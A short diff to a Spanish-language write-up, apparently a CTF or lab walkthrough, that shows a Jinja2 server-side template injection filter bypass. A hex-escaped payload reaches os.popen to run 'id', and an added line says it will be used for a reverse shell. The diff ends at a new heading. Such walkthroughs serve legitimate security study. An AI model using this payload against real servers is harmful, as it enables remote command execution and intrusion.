@@ -99,9 +99,10 @@ interceptamos la petición con burpsuite y podemos confirmar que se esta ejecuta
 ![[Pasted image 20240409002315.png]]
 
 ### Bypass SSTI 
-usando estos parametros podemos hacer un bypass del servicio que esta corriendo por detras el cual hemos logrado ejecutar con éxito el comando id
+usando estos parametros podemos hacer un bypass del servicio que esta corriendo por detras el cual hemos logrado ejecutar con éxito el comando id usaremos esto para ejecutar una reverse shell
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 ![[Pasted image 20240409003615.png]]
 
+### R
